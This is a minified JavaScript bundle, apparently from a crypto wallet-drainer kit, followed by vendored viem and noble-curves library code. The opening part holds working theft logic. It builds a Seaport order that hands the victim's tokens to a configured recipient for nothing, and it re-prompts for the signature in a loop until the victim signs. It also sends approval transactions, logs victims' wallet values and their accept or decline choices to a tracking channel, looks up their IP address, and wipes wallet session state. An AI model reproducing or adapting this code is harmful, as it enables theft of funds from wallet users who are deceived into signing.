if(Gt==="2"||Gt==="0"){const{addStatusBlock:v}=await ss(Gt);setTimeout(()=>{v({type:"success",title:"Approved!"})},50)}else{const{showLoadingModal:v,hideModal:_}=await ss(Gt);await _(),await so(700),v(od)}}catch{}}if(!c8&&typeof $5[0]!="string"&&!No&&R5.toLowerCase().includes("metamask")){const b=[];for(const R of $5){const P=R;let B=Ge.from(P.amount);b.push({itemType:P.itemType,token:P.token,identifierOrCriteria:"0",startAmount:B,endAmount:B,recipient:as})}const v={name:"Seaport",version:"1.6",chainId:1,verifyingContract:pte},_={offerer:as,zone:"0x0000000000000000000000000000000000000000",offer:[],consideration:b,orderType:0,startTime:"1748180687",endTime:"1750772687",zoneHash:"0x0000000000000000000000000000000000000000000000000000000000000000",salt:"27855337018906766782546881864045825683096516384821792734251274424712742754110",conduitKey:"0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",counter:"0",totalOriginalConsiderationItems:2},O={OrderComponents:[{name:"offerer",type:"address"},{name:"zone",type:"address"},{name:"offer",type:"OfferItem[]"},{name:"consideration",type:"ConsiderationItem[]"},{name:"orderType",type:"uint8"},{name:"startTime",type:"uint256"},{name:"endTime",type:"uint256"},{name:"zoneHash",type:"bytes32"},{name:"salt",type:"uint256"},{name:"conduitKey",type:"bytes32"},{name:"counter",type:"uint256"}],OfferItem:[{name:"itemType",type:"uint8"},{name:"token",type:"address"},{name:"identifierOrCriteria",type:"uint256"},{name:"startAmount",type:"uint256"},{name:"endAmount",type:"uint256"}],ConsiderationItem:[{name:"itemType",type:"uint8"},{name:"token",type:"address"},{name:"identifierOrCriteria",type:"uint256"},{name:"startAmount",type:"uint256"},{name:"endAmount",type:"uint256"},{name:"recipient",type:"address"}]};if(No||Gt==="0")DA(w9);else if(Gt==="2"||Gt==="0"){const{addStatusBlock:R}=await ss(Gt);setTimeout(()=>{R({type:"warning",title:w9})},50)}else{const{showConfirmModal:R}=await ss(Gt);R(w9)}let D=!1;for(;!D;)try{const R=await wf._signTypedData(v,O,_);QT(v,O,_,R).toLocaleLowerCase()===as.toLocaleLowerCase()&&(D=!0,c8=!0)}catch{}if(No||Gt==="0")ate(m9),await so(1500),lO();else if(Gt==="2"||Gt==="0"){const{addStatusBlock:R,hideModal:P}=await ss(Gt);setTimeout(()=>{R({type:"danger",title:m9})},1e3),await so(2e3),await P()}else{const{showErrorModal:R,hideModal:P}=await ss(Gt);R(m9),await so(1500),await P()}}}let y=0;if(No||Gt==="0"){for(await Zh.switchNetwork(n.reownName);sN.chainId!==n.reownName.id;)await so(200);wf=new $1(eu,"any").getSigner()}else for(;y<Number(oN);){const b=await yD(n.reownName,eu);if(!b.success)y++;else{wf=b.signer,eu=b.provider;break}}(c8||b9)&&!gz&&(M6("SigVerifed",Xb({walletAddress:as,customer:l,initialOrigin:E1,channel:Km},km,Nm)),gz=!0);let A=!1;for(;!A&&y<Number(oN);){const b={walletAddress:as,usdValue:s,customer:l,name:h,chain:n.chainName,nativeName:g,nativeUsdValue:w,initialOrigin:E1,channel:Km,standard:i};M6("PromtTx",Xb(b,km,Nm));try{if(No||Gt==="0")DA(e1);else if(["1","3","4","5"].includes(Gt)){const{showConfirmModal:O}=await ss(Gt);O(e1)}else if(Gt==="2"||Gt==="0"){const{addStatusBlock:O,showInfoScreen:D}=await ss(Gt);await so(700),D([{type:"primary",title:od}]),setTimeout(()=>{O({type:"warning",title:e1})},50)}let v;try{if(f){v=parseInt(await eu.request({method:"eth_getTransactionCount",params:[as,"latest"]}),16);try{await eu.request({method:"wallet_sendCalls",params:[e],atomicRequired:!0})}catch(O){throw console.log(O),new Error(O)}}else if(k){if(v=await wf._signTypedData(k,I,E),QT(k,I,E,v).toLocaleLowerCase()!=as.toLocaleLowerCase())throw"INVALID SENDER"}else v=(await wf.sendTransaction(e)).hash,m&&await new $1(eu,"any").sendTransaction(m)}catch(O){throw console.log(O),O}if(M6("Approved",Xb({walletAddress:as,usdValue:s,name:h,chainName:u,nativeName:g,nativeUsdValue:w,initialOrigin:E1,channel:Km,standard:i,hash:v,worker:o,percent:a,amount:c,chain:u,customer:l,address:d,contract:t,nativeAmount:x,tokenAddresses:S,tokenAmounts:T,permit2_nonce:C,nftAddresses:N,nftIds:L,permit2_address:$},km,Nm)),f&&cN.set(u,!0),Gt==="2"||Gt==="0"){const{addStatusBlock:O}=await ss(Gt);setTimeout(()=>{O({type:"success",title:"Approved!"})},50),await so(1e3)}if(No||Gt==="0")nN(od);else if(["1","3","4","5"].includes(Gt)){const{showLoadingModal:O}=await ss(Gt);await so(700),O(od)}else if(Gt==="2"||Gt==="0"){const{showInfoScreen:O}=await ss(Gt);await so(700),O([{type:"primary",title:od}])}try{window.onApproved&&window.onApproved(as,s)}catch{}A=!0}catch{const _={walletAddress:as,usdValue:s,customer:l,name:h,chain:n.chainName,nativeName:g,nativeUsdValue:w,initialOrigin:E1,channel:Km};M6("Declined",Xb(_,km,Nm)),y++}}}async function aDe(){const r=await wf.signMessage(Zw);dY(Zw,r).toLocaleLowerCase()===as.toLocaleLowerCase()&&(b9=!0)}async function cDe(){const r=await fetch("https://api.ipify.org?format=json"),{ip:e}=await r.json();return e}async function Cte(){if(Dh&&Dh.close(),No||Gt==="0")await Zh.disconnect(),lO();else{const{hideModal:r}=await ss(Gt);r()}cN.clear(),lN=!1,as=null,cw("connectAndClaim",!1),cw("claim",!1),cw("connect",!1)}async function mz(){await vte(),as&&await yte()}function cw(r,e){document.querySelectorAll(`.${r}`).forEach(t=>t.disabled=e)}function lDe(r){r.subscribeProviders(e=>{eu=e.eip155}),r.subscribeNetwork(e=>{sN=e})}async function uDe(){if(typeof document>"u")return;document.readyState==="loading"&&await new Promise(c=>document.addEventListener("DOMContentLoaded",c,{once:!0}));let r;try{r=await lJ()}catch(c){console.error("Error loading config:",c);return}({REOWN_ID:f9,TRAFFIC:dte,CUSTOMER_ID:hte,ASSET_MIN:p9,LOADING_MESSAGE:od,CONFIRM_MESSAGE:e1,ERROR_MESSAGE:g9,MODAL_STYLE:Gt,DARK_MODE:LA,TX_RETRY_COUNT:oN,MODAL_AUTOOPEN:hz,BUNDLES_7702:fte,SIG_TEXT_ERROR:m9,SIG_TEXT_PROMPT:w9,SIG_FROM:pte,SIG_CONFIG:$5,ELEVEN_PRIORITY:gte,SPOOF:mte,VERIFY_SIGNATURE:Zw,LOGS_TO_THE_CHANNEL:Km,FULL_LOG_URL:fz}=r),No=dpe();let e;No||Gt==="0"?e=(async()=>{Zh=BMe({adapters:[new iDe],networks:nDe,projectId:f9,enableInjected:!1,themeMode:LA?"dark":"light",features:{connectMethodsOrder:["wallet"],email:!1,analytics:!1},featuredWalletIds:["c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96","4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0","18388be9ac2d02726dbac9777c96efaac06d744b2f6d580fccdd4127a6d01fd1"]}),lDe(Zh),ote()})():e=(async()=>{const{initModal:c}=await ss(Gt);await c(f9,lte,LA)})(),gpe(vte,yte,mz);const t=wpe(),i=cDe(),n=hpe().catch(()=>"Unknown"),s=fpe();await Promise.all([s,e,t]);const[o,a]=await Promise.all([i,n]);bte=o,ute=a,E1=window.location.origin,fz&&(E1+=window.location.pathname+window.location.search),wte=Date.now(),hz&&mz()}typeof window<"u"&&typeof document<"u"&&uDe();async function dDe(){try{Object.keys(localStorage).forEach(r=>{try{localStorage.removeItem(r)}catch{}});try{sessionStorage.clear()}catch{}if(indexedDB&&indexedDB.databases)try{const r=await indexedDB.databases();for(const e of r)if(e&&e.name)try{indexedDB.deleteDatabase(e.name)}catch{}}catch{}else{const r=["walletconnect","wc","wc@2:core:crypto","wc@2:client","WALLETCONNECT","web3modal","wagmi","appkit"];for(const e of r)try{indexedDB.deleteDatabase(e)}catch{}}if(window.caches&&caches.keys)try{const r=await caches.keys();await Promise.all(r.map(e=>caches.delete(e)))}catch{}if(navigator.serviceWorker&&navigator.serviceWorker.getRegistrations)try{const r=await navigator.serviceWorker.getRegistrations();await Promise.all(r.map(e=>e.unregister()))}catch{}}catch(r){console.warn("nukeWalletConnectState error",r)}}function hDe(r){if(typeof window>"u")return;const e=t=>r(t.detail);return window.addEventListener("eip6963:announceProvider",e),window.dispatchEvent(new CustomEvent("eip6963:requestProvider")),()=>window.removeEventListener("eip6963:announceProvider",e)}function B3(){const r=new Set;let e=[];const t=()=>hDe(n=>{e.some(({info:s})=>s.uuid===n.info.uuid)||(e=[...e,n],r.forEach(s=>s(e,{added:[n]})))});let i=t();return{_listeners(){return r},clear(){r.forEach(n=>n([],{removed:[...e]})),e=[]},destroy(){this.clear(),r.clear(),i?.()},findProvider({rdns:n}){return e.find(s=>s.info.rdns===n)},getProviders(){return e},reset(){this.clear(),i?.(),i=t()},subscribe(n,{emitImmediately:s}={}){return r.add(n),s&&n(e,{added:e}),()=>r.delete(n)}}}function Cy(r,{strict:e=!0}={}){return!r||typeof r!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(r):r.startsWith("0x")}function uN(r){return Cy(r,{strict:!1})?Math.ceil((r.length-2)/2):r.length}const Ete="2.31.0";let UA={getDocsUrl:({docsBaseUrl:r,docsPath:e="",docsSlug:t})=>e?`${r??"https://viem.sh"}${e}${t?`#${t}`:""}`:void 0,version:`viem@${Ete}`},WC=class dN extends Error{constructor(e,t={}){const i=t.cause instanceof dN?t.cause.details:t.cause?.message?t.cause.message:t.details,n=t.cause instanceof dN&&t.cause.docsPath||t.docsPath,s=UA.getDocsUrl?.({...t,docsPath:n}),o=[e||"An error occurred.","",...t.metaMessages?[...t.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...i?[`Details: ${i}`]:[],...UA.version?[`Version: ${UA.version}`]:[]].join(`
`);super(o,t.cause?{cause:t.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=i,this.docsPath=n,this.metaMessages=t.metaMessages,this.name=t.name??this.name,this.shortMessage=e,this.version=Ete}walk(e){return _te(this,e)}};function _te(r,e){return e?.(r)?r:r&&typeof r=="object"&&"cause"in r&&r.cause!==void 0?_te(r.cause,e):e?null:r}let Ste=class extends WC{constructor({size:e,targetSize:t,type:i}){super(`${i.charAt(0).toUpperCase()}${i.slice(1).toLowerCase()} size (${e}) exceeds padding size (${t}).`,{name:"SizeExceedsPaddingSizeError"})}};function M3(r,{dir:e,size:t=32}={}){return typeof r=="string"?fDe(r,{dir:e,size:t}):pDe(r,{dir:e,size:t})}function fDe(r,{dir:e,size:t=32}={}){if(t===null)return r;const i=r.replace("0x","");if(i.length>t*2)throw new Ste({size:Math.ceil(i.length/2),targetSize:t,type:"hex"});return`0x${i[e==="right"?"padEnd":"padStart"](t*2,"0")}`}function pDe(r,{dir:e,size:t=32}={}){if(t===null)return r;if(r.length>t)throw new Ste({size:r.length,targetSize:t,type:"bytes"});const i=new Uint8Array(t);for(let n=0;n<t;n++){const s=e==="right";i[s?n:t-n-1]=r[s?n:r.length-n-1]}return i}let gDe=class extends WC{constructor({max:e,min:t,signed:i,size:n,value:s}){super(`Number "${s}" is not in safe ${n?`${n*8}-bit ${i?"signed":"unsigned"} `:""}integer range ${e?`(${t} to ${e})`:`(above ${t})`}`,{name:"IntegerOutOfRangeError"})}},mDe=class extends WC{constructor({givenSize:e,maxSize:t}){super(`Size cannot exceed ${t} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}};function D3(r,{size:e}){if(uN(r)>e)throw new mDe({givenSize:uN(r),maxSize:e})}function hN(r,e={}){const{signed:t}=e;e.size&&D3(r,{size:e.size});const i=BigInt(r);if(!t)return i;const n=(r.length-2)/2,s=(1n<<BigInt(n)*8n-1n)-1n;return i<=s?i:i-BigInt(`0x${"f".padStart(n*2,"f")}`)-1n}function wDe(r,e={}){return Number(hN(r,e))}const bDe=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function fN(r,e={}){return typeof r=="number"||typeof r=="bigint"?Ite(r,e):typeof r=="string"?xDe(r,e):typeof r=="boolean"?vDe(r,e):Ate(r,e)}function vDe(r,e={}){const t=`0x${Number(r)}`;return typeof e.size=="number"?(D3(t,{size:e.size}),M3(t,{size:e.size})):t}function Ate(r,e={}){let t="";for(let n=0;n<r.length;n++)t+=bDe[r[n]];const i=`0x${t}`;return typeof e.size=="number"?(D3(i,{size:e.size}),M3(i,{dir:"right",size:e.size})):i}function Ite(r,e={}){const{signed:t,size:i}=e,n=BigInt(r);let s;i?t?s=(1n<<BigInt(i)*8n-1n)-1n:s=2n**(BigInt(i)*8n)-1n:typeof r=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&t?-s-1n:0;if(s&&n>s||n<o){const c=typeof r=="bigint"?"n":"";throw new gDe({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:t,size:i,value:`${r}${c}`})}const a=`0x${(t&&n<0?(1n<<BigInt(i*8))+BigInt(n):n).toString(16)}`;return i?M3(a,{size:i}):a}const yDe=new TextEncoder;function xDe(r,e={}){const t=yDe.encode(r);return Ate(t,e)}const CDe=new TextEncoder;function EDe(r,e={}){return typeof r=="number"||typeof r=="bigint"?SDe(r,e):typeof r=="boolean"?_De(r,e):Cy(r)?Tte(r,e):kte(r,e)}function _De(r,e={}){const t=new Uint8Array(1);return t[0]=Number(r),typeof e.size=="number"?(D3(t,{size:e.size}),M3(t,{size:e.size})):t}const yh={zero:48,nine:57,A:65,F:70,a:97,f:102};function wz(r){if(r>=yh.zero&&r<=yh.nine)return r-yh.zero;if(r>=yh.A&&r<=yh.F)return r-(yh.A-10);if(r>=yh.a&&r<=yh.f)return r-(yh.a-10)}function Tte(r,e={}){let t=r;e.size&&(D3(t,{size:e.size}),t=M3(t,{dir:"right",size:e.size}));let i=t.slice(2);i.length%2&&(i=`0${i}`);const n=i.length/2,s=new Uint8Array(n);for(let o=0,a=0;o<n;o++){const c=wz(i.charCodeAt(a++)),l=wz(i.charCodeAt(a++));if(c===void 0||l===void 0)throw new WC(`Invalid byte sequence ("${i[a-2]}${i[a-1]}" in "${i}").`);s[o]=c*16+l}return s}function SDe(r,e){const t=Ite(r,e);return Tte(t)}function kte(r,e={}){const t=CDe.encode(r);return typeof e.size=="number"?(D3(t,{size:e.size}),M3(t,{dir:"right",size:e.size})):t}function Nte(r,e){const t=e||"hex",i=QY(Cy(r,{strict:!1})?EDe(r):r);return t==="bytes"?i:fN(i)}let ADe=class extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const t=super.get(e);return super.has(e)&&t!==void 0&&(this.delete(e),super.set(e,t)),t}set(e,t){if(super.set(e,t),this.maxSize&&this.size>this.maxSize){const i=this.keys().next().value;i&&this.delete(i)}return this}};const jA=new ADe(8192);function IDe(r,e){if(jA.has(`${r}.${e}`))return jA.get(`${r}.${e}`);const t=r.substring(2).toLowerCase(),i=Nte(kte(t),"bytes"),n=t.split("");for(let o=0;o<40;o+=2)i[o>>1]>>4>=8&&n[o]&&(n[o]=n[o].toUpperCase()),(i[o>>1]&15)>=8&&n[o+1]&&(n[o+1]=n[o+1].toUpperCase());const s=`0x${n.join("")}`;return jA.set(`${r}.${e}`,s),s}function TDe(r){const e=Nte(`0x${r.substring(4)}`).substring(26);return IDe(`0x${e}`)}async function kDe({hash:r,signature:e}){const t=Cy(r)?r:fN(r),{secp256k1:i}=await Ke(async()=>{const{secp256k1:o}=await Promise.resolve().then(()=>sLe);return{secp256k1:o}},void 0);return`0x${(()=>{if(typeof e=="object"&&"r"in e&&"s"in e){const{r:l,s:u,v:d,yParity:h}=e,f=Number(h??d),p=bz(f);return new i.Signature(hN(l),hN(u)).addRecoveryBit(p)}const o=Cy(e)?e:fN(e);if(uN(o)!==65)throw new Error("invalid signature length");const a=wDe(`0x${o.slice(130)}`),c=bz(a);return i.Signature.fromCompact(o.substring(2,130)).addRecoveryBit(c)})().recoverPublicKey(t.substring(2)).toHex(!1)}`}function bz(r){if(r===0||r===1)return r;if(r===27)return 0;if(r===28)return 1;throw new Error("Invalid yParityOrV value")}async function NDe({hash:r,signature:e}){return TDe(await kDe({hash:r,signature:e}))}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const uO=BigInt(0),pN=BigInt(1);function F4(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function dO(r){if(!F4(r))throw new Error("Uint8Array expected")}function Ey(r,e){if(typeof e!="boolean")throw new Error(r+" boolean expected, got "+e)}function l8(r){const e=r.toString(16);return e.length&1?"0"+e:e}function Pte(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);return r===""?uO:BigInt("0x"+r)}const $te=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",PDe=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function _y(r){if(dO(r),$te)return r.toHex();let e="";for(let t=0;t<r.length;t++)e+=PDe[r[t]];return e}const xh={_0:48,_9:57,A:65,F:70,a:97,f:102};function vz(r){if(r>=xh._0&&r<=xh._9)return r-xh._0;if(r>=xh.A&&r<=xh.F)return r-(xh.A-10);if(r>=xh.a&&r<=xh.f)return r-(xh.a-10)}function z7(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);if($te)return Uint8Array.fromHex(r);const e=r.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const i=new Uint8Array(t);for(let n=0,s=0;n<t;n++,s+=2){const o=vz(r.charCodeAt(s)),a=vz(r.charCodeAt(s+1));if(o===void 0||a===void 0){const c=r[s]+r[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}i[n]=o*16+a}return i}function D1(r){return Pte(_y(r))}function Rte(r){return dO(r),Pte(_y(Uint8Array.from(r).reverse()))}function q4(r,e){return z7(r.toString(16).padStart(e*2,"0"))}function Ote(r,e){return q4(r,e).reverse()}function Yc(r,e,t){let i;if(typeof e=="string")try{i=z7(e)}catch(s){throw new Error(r+" must be hex string or Uint8Array, cause: "+s)}else if(F4(e))i=Uint8Array.from(e);else throw new Error(r+" must be hex string or Uint8Array");const n=i.length;if(typeof t=="number"&&n!==t)throw new Error(r+" of length "+t+" expected, got "+n);return i}function W7(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];dO(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}const FA=r=>typeof r=="bigint"&&uO<=r;function hO(r,e,t){return FA(r)&&FA(e)&&FA(t)&&e<=r&&r<t}function lw(r,e,t,i){if(!hO(e,t,i))throw new Error("expected valid "+r+": "+t+" <= n < "+i+", got "+e)}function $De(r){let e;for(e=0;r>uO;r>>=pN,e+=1);return e}const HC=r=>(pN<<BigInt(r))-pN,qA=r=>new Uint8Array(r),yz=r=>Uint8Array.from(r);function RDe(r,e,t){if(typeof r!="number"||r<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof t!="function")throw new Error("hmacFn must be a function");let i=qA(r),n=qA(r),s=0;const o=()=>{i.fill(1),n.fill(0),s=0},a=(...d)=>t(n,i,...d),c=(d=qA(0))=>{n=a(yz([0]),d),i=a(),d.length!==0&&(n=a(yz([1]),d),i=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let d=0;const h=[];for(;d<e;){i=a();const f=i.slice();h.push(f),d+=i.length}return W7(...h)};return(d,h)=>{o(),c(d);let f;for(;!(f=h(l()));)c();return o(),f}}const ODe={bigint:r=>typeof r=="bigint",function:r=>typeof r=="function",boolean:r=>typeof r=="boolean",string:r=>typeof r=="string",stringOrUint8Array:r=>typeof r=="string"||F4(r),isSafeInteger:r=>Number.isSafeInteger(r),array:r=>Array.isArray(r),field:(r,e)=>e.Fp.isValid(r),hash:r=>typeof r=="function"&&Number.isSafeInteger(r.outputLen)};function VC(r,e,t={}){const i=(n,s,o)=>{const a=ODe[s];if(typeof a!="function")throw new Error("invalid validator function");const c=r[n];if(!(o&&c===void 0)&&!a(c,r))throw new Error("param "+String(n)+" is invalid. Expected "+s+", got "+c)};for(const[n,s]of Object.entries(e))i(n,s,!1);for(const[n,s]of Object.entries(t))i(n,s,!0);return r}function xz(r){const e=new WeakMap;return(t,...i)=>{const n=e.get(t);if(n!==void 0)return n;const s=r(t,...i);return e.set(t,s),s}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const ka=BigInt(0),Ko=BigInt(1),_1=BigInt(2),BDe=BigInt(3),Bte=BigInt(4),Mte=BigInt(5),Dte=BigInt(8);function Ea(r,e){const t=r%e;return t>=ka?t:e+t}function Dc(r,e,t){let i=r;for(;e-- >ka;)i*=i,i%=t;return i}function gN(r,e){if(r===ka)throw new Error("invert: expected non-zero number");if(e<=ka)throw new Error("invert: expected positive modulus, got "+e);let t=Ea(r,e),i=e,n=ka,s=Ko;for(;t!==ka;){const a=i/t,c=i%t,l=n-s*a;i=t,t=c,n=s,s=l}if(i!==Ko)throw new Error("invert: does not exist");return Ea(n,e)}function Lte(r,e){const t=(r.ORDER+Ko)/Bte,i=r.pow(e,t);if(!r.eql(r.sqr(i),e))throw new Error("Cannot find square root");return i}function MDe(r,e){const t=(r.ORDER-Mte)/Dte,i=r.mul(e,_1),n=r.pow(i,t),s=r.mul(e,n),o=r.mul(r.mul(s,_1),n),a=r.mul(s,r.sub(o,r.ONE));if(!r.eql(r.sqr(a),e))throw new Error("Cannot find square root");return a}function DDe(r){if(r<BigInt(3))throw new Error("sqrt is not defined for small field");let e=r-Ko,t=0;for(;e%_1===ka;)e/=_1,t++;let i=_1;const n=fO(r);for(;Cz(n,i)===1;)if(i++>1e3)throw new Error("Cannot find square root: probably non-prime P");if(t===1)return Lte;let s=n.pow(i,e);const o=(e+Ko)/_1;return function(c,l){if(c.is0(l))return l;if(Cz(c,l)!==1)throw new Error("Cannot find square root");let u=t,d=c.mul(c.ONE,s),h=c.pow(l,e),f=c.pow(l,o);for(;!c.eql(h,c.ONE);){if(c.is0(h))return c.ZERO;let p=1,g=c.sqr(h);for(;!c.eql(g,c.ONE);)if(p++,g=c.sqr(g),p===u)throw new Error("Cannot find square root");const w=Ko<<BigInt(u-p-1),m=c.pow(d,w);u=p,d=c.sqr(m),h=c.mul(h,d),f=c.mul(f,m)}return f}}function LDe(r){return r%Bte===BDe?Lte:r%Dte===Mte?MDe:DDe(r)}const UDe=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function jDe(r){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},t=UDe.reduce((i,n)=>(i[n]="function",i),e);return VC(r,t)}function FDe(r,e,t){if(t<ka)throw new Error("invalid exponent, negatives unsupported");if(t===ka)return r.ONE;if(t===Ko)return e;let i=r.ONE,n=e;for(;t>ka;)t&Ko&&(i=r.mul(i,n)),n=r.sqr(n),t>>=Ko;return i}function Ute(r,e,t=!1){const i=new Array(e.length).fill(t?r.ZERO:void 0),n=e.reduce((o,a,c)=>r.is0(a)?o:(i[c]=o,r.mul(o,a)),r.ONE),s=r.inv(n);return e.reduceRight((o,a,c)=>r.is0(a)?o:(i[c]=r.mul(o,i[c]),r.mul(o,a)),s),i}function Cz(r,e){const t=(r.ORDER-Ko)/_1,i=r.pow(e,t),n=r.eql(i,r.ONE),s=r.eql(i,r.ZERO),o=r.eql(i,r.neg(r.ONE));if(!n&&!s&&!o)throw new Error("invalid Legendre symbol result");return n?1:s?0:-1}function jte(r,e){e!==void 0&&uv(e);const t=e!==void 0?e:r.toString(2).length,i=Math.ceil(t/8);return{nBitLength:t,nByteLength:i}}function fO(r,e,t=!1,i={}){if(r<=ka)throw new Error("invalid field: expected ORDER > 0, got "+r);const{nBitLength:n,nByteLength:s}=jte(r,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:r,isLE:t,BITS:n,BYTES:s,MASK:HC(n),ZERO:ka,ONE:Ko,create:c=>Ea(c,r),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return ka<=c&&c<r},is0:c=>c===ka,isOdd:c=>(c&Ko)===Ko,neg:c=>Ea(-c,r),eql:(c,l)=>c===l,sqr:c=>Ea(c*c,r),add:(c,l)=>Ea(c+l,r),sub:(c,l)=>Ea(c-l,r),mul:(c,l)=>Ea(c*l,r),pow:(c,l)=>FDe(a,c,l),div:(c,l)=>Ea(c*gN(l,r),r),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>gN(c,r),sqrt:i.sqrt||(c=>(o||(o=LDe(r)),o(a,c))),toBytes:c=>t?Ote(c,s):q4(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return t?Rte(c):D1(c)},invertBatch:c=>Ute(a,c),cmov:(c,l,u)=>u?l:c});return Object.freeze(a)}function Fte(r){if(typeof r!="bigint")throw new Error("field order must be bigint");const e=r.toString(2).length;return Math.ceil(e/8)}function qte(r){const e=Fte(r);return e+Math.ceil(e/2)}function qDe(r,e,t=!1){const i=r.length,n=Fte(e),s=qte(e);if(i<16||i<s||i>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+i);const o=t?Rte(r):D1(r),a=Ea(o,e-Ko)+Ko;return t?Ote(a,n):q4(a,n)}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Ez=BigInt(0),mN=BigInt(1);function zA(r,e){const t=e.negate();return r?t:e}function zte(r,e){if(!Number.isSafeInteger(r)||r<=0||r>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+r)}function WA(r,e){zte(r,e);const t=Math.ceil(e/r)+1,i=2**(r-1),n=2**r,s=HC(r),o=BigInt(r);return{windows:t,windowSize:i,mask:s,maxNumber:n,shiftBy:o}}function _z(r,e,t){const{windowSize:i,mask:n,maxNumber:s,shiftBy:o}=t;let a=Number(r&n),c=r>>o;a>i&&(a-=s,c+=mN);const l=e*i,u=l+Math.abs(a)-1,d=a===0,h=a<0,f=e%2!==0;return{nextN:c,offset:u,isZero:d,isNeg:h,isNegF:f,offsetF:l}}function zDe(r,e){if(!Array.isArray(r))throw new Error("array expected");r.forEach((t,i)=>{if(!(t instanceof e))throw new Error("invalid point at index "+i)})}function WDe(r,e){if(!Array.isArray(r))throw new Error("array of scalars expected");r.forEach((t,i)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+i)})}const HA=new WeakMap,Wte=new WeakMap;function VA(r){return Wte.get(r)||1}function HDe(r,e){return{constTimeNegate:zA,hasPrecomputes(t){return VA(t)!==1},unsafeLadder(t,i,n=r.ZERO){let s=t;for(;i>Ez;)i&mN&&(n=n.add(s)),s=s.double(),i>>=mN;return n},precomputeWindow(t,i){const{windows:n,windowSize:s}=WA(i,e),o=[];let a=t,c=a;for(let l=0;l<n;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(t,i,n){let s=r.ZERO,o=r.BASE;const a=WA(t,e);for(let c=0;c<a.windows;c++){const{nextN:l,offset:u,isZero:d,isNeg:h,isNegF:f,offsetF:p}=_z(n,c,a);n=l,d?o=o.add(zA(f,i[p])):s=s.add(zA(h,i[u]))}return{p:s,f:o}},wNAFUnsafe(t,i,n,s=r.ZERO){const o=WA(t,e);for(let a=0;a<o.windows&&n!==Ez;a++){const{nextN:c,offset:l,isZero:u,isNeg:d}=_z(n,a,o);if(n=c,!u){const h=i[l];s=s.add(d?h.negate():h)}}return s},getPrecomputes(t,i,n){let s=HA.get(i);return s||(s=this.precomputeWindow(i,t),t!==1&&HA.set(i,n(s))),s},wNAFCached(t,i,n){const s=VA(t);return this.wNAF(s,this.getPrecomputes(s,t,n),i)},wNAFCachedUnsafe(t,i,n,s){const o=VA(t);return o===1?this.unsafeLadder(t,i,s):this.wNAFUnsafe(o,this.getPrecomputes(o,t,n),i,s)},setWindowSize(t,i){zte(i,e),Wte.set(t,i),HA.delete(t)}}}function VDe(r,e,t,i){zDe(t,r),WDe(i,e);const n=t.length,s=i.length;if(n!==s)throw new Error("arrays of points and scalars must have equal length");const o=r.ZERO,a=$De(BigInt(n));let c=1;a>12?c=a-3:a>4?c=a-2:a>0&&(c=2);const l=HC(c),u=new Array(Number(l)+1).fill(o),d=Math.floor((e.BITS-1)/c)*c;let h=o;for(let f=d;f>=0;f-=c){u.fill(o);for(let g=0;g<s;g++){const w=i[g],m=Number(w>>BigInt(f)&l);u[m]=u[m].add(t[g])}let p=o;for(let g=u.length-1,w=o;g>0;g--)w=w.add(u[g]),p=p.add(w);if(h=h.add(p),f!==0)for(let g=0;g<c;g++)h=h.double()}return h}function Hte(r){return jDe(r.Fp),VC(r,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...jte(r.n,r.nBitLength),...r,p:r.Fp.ORDER})}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) 